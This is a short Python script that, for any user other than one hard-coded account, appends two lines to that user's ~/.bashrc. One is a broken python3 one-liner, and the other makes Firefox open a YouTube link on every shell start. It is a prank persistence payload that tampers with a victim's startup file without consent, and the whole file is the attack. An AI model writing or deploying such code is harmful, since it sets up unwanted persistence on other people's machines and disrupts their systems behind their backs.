import os
import subprocess
import getpass

username = getpass.getuser()

if username != "christopherlycan747":
    # Define the string to search for in the .bashrc file
    string_to_search = "python3 -c 'def r\'^(a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z)\z\'(): return \"you suck\"'"

    # Define the command to append the string to the .bashrc file
    command = f'echo "{string_to_search}" >> ~/.bashrc'

    # Check if the string is already in the .bashrc file
    if string_to_search not in open(os.path.expanduser("~/.bashrc")).read():
        # Append the string to the .bashrc file
        subprocess.call(command, shell=True)
    else:
        pass
    # Define the string to search for in the .bashrc file
    string_to_search = "firefox 'https://www.youtube.com/watch?v=2nXGPZaTKik'"

    # Define the command to append the string to the .bashrc file
    command = f'echo "{string_to_search}" >> ~/.bashrc'

    # Check if the string is already in the .bashrc file
    if string_to_search not in open(os.path.expanduser("~/.bashrc")).read():
        # Append the string to the .bashrc file
        subprocess.call(command, shell=True)
    else:
        pass
else:
    pass